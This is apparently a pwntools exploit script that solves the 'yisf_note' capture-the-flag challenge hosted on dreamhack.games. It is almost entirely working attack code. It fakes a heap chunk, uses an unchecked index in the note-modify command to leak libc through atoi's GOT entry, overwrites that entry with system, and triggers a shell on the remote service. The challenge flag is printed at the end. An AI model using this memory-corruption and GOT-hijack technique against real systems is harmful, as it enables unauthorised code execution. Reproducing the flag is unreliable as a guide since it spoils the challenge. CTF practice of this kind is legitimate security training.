#!/usr/bin/env python3

from pwn import *

exe = ELF('./yisf_note_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def write_m(size, desc, detail):
	sa(b"command\n", b"61439")
	payload = desc # desc max 0xA
	payload = payload.ljust(0xA, b"\x00")
	payload += p32(size) # size max 0xF000
	payload += detail
	payload = b"W" + payload
	s(payload)

def read_m(index):
	sa(b"command\n", b"61439")
	payload = p16(index)
	payload = b"R" + payload
	s(payload)

def modify_m(index, size, detail):
	sa(b"command\n", b"61439")
	payload = p16(index)
	payload += p32(size)
	payload += detail
	payload = b"M"  + payload
	s(payload)

def list_m():
	sa(b"command\n", b"61439")
	payload = b"L"
	s(payload)

def delete_m(index):
	sa(b"command\n", b"61439")
	payload = p16(index)
	payload = b"D" + payload
	s(payload)

script = '''
b *0x4016EC
'''

p = remote("host1.dreamhack.games", 9335)
#p = process('./yisf_note_patched')
#p = gdb.debug('./yisf_note_patched', gdbscript = script)

# create fake chunk at name
chunk_head = 0x4040c0
payload = b"A" * 0x10 + p64(chunk_head) + p64(0xffff)
sa(b"name : ", payload[:0x2f:])

# modify doesnt check out of bound
## leak libc
atoi_got = 0x404068
payload = b"A" * 0x10 + p64(atoi_got) + p64(0x8)
modify_m(0xfa0, 0x20, payload)
read_m(0)

rcu(b"detail : ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['atoi']
lleak("libc_base", libc_base)

# overwrite atoi got
system = libc_base + libc.symbols['system']
modify_m(0, 0x8, p64(system))

# trigger
sa(b"command\n", b"sh\x00")

p.interactive()
#YISF{7h15_n073_15_r34lly_1nc0nv3n13n7}
